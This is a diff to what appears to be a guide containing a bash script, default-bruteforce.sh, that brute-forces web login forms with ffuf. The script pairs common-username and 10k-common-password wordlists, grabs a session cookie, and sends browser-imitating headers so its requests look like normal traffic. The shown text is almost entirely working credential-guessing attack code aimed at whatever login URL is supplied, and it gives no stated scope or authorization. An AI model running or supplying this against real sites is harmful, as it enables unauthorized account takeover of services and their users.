@@ -89,7 +89,6 @@ sudo nano default-bruteforce.sh
 # CONFIG
 USERLIST="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
 PASSLIST="/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
-UA_LIST="/usr/share/seclists/Fuzzing/User-Agents/user-agents-whatismybrowserdotcom-mid.txt"
 
 # INPUT CHECK
 if [ $# -lt 1 ]; then
@@ -172,20 +171,28 @@ DATA="${USERNAME_FIELD}=FUZZ1&${PASSWORD_FIELD}=FUZZ2"
 [ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ] && DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"
 
 # EXTRACT COOKIES
-COOKIES=$(curl -s -I "$LOGIN" | grep -i '^Set-Cookie:' | sed -E 's/^Set-Cookie: //I' | tr -d '\r\n')
+COOKIES=$(curl -s -I "$URL" \
+  | grep -i '^Set-Cookie:' \
+  | sed -E 's/^Set-Cookie: //I' \
+  | cut -d';' -f1 \
+  | grep -i 'PHPSESSID')
 
 # HEADERS
 HEADERS=(
+  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0"
+  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+  -H "Accept-Language: en-US,fa-IR;q=0.5"
+  -H "Accept-Encoding: gzip, deflate, br"
   -H "Content-Type: application/x-www-form-urlencoded"
-  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0"
-  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
-  -H "Accept-Language: en-US,en;q=0.5"
-  -H "Accept-Encoding: gzip, deflate"
+  -H "Origin: $URL"
   -H "Connection: keep-alive"
-  -H "Upgrade-Insecure-Requests: 1"
   -H "Referer: $LOGIN"
+  -H "Cookie: $COOKIES"
+  -H "Upgrade-Insecure-Requests: 1"
+  -H "DNT: 1"
+  -H "Sec-GPC: 1"
+  -H "Priority: u=0, i"
 )
-[ -n "$COOKIES" ] && HEADERS+=(-H "Cookie: $COOKIES")
 
 # RUN FFUF
 if [[ "$METHOD" == "get" ]]; then
@@ -193,22 +200,18 @@ if [[ "$METHOD" == "get" ]]; then
     ffuf -u "$FFUF_URL" \
          -w "$USERLIST:FUZZ1" \
          -w "$PASSLIST:FUZZ2" \
-         -w "$UA_LIST:UA" \
          -X GET \
          -ac -c -r \
-         -mc 200,301,302 \
-         -H "User-Agent: UA" \
+         -mc 200 \
          "${HEADERS[@]}"
 else
     ffuf -u "$FULL_ACTION" \
          -w "$USERLIST:FUZZ1" \
          -w "$PASSLIST:FUZZ2" \
-         -w "$UA_LIST:UA" \
          -X POST \
          -d "$DATA" \
          -ac -c -r \
-         -mc 200,301,302 \
-         -H "User-Agent: UA" \
+         -mc 200 \
          "${HEADERS[@]}"
 fi
 ```
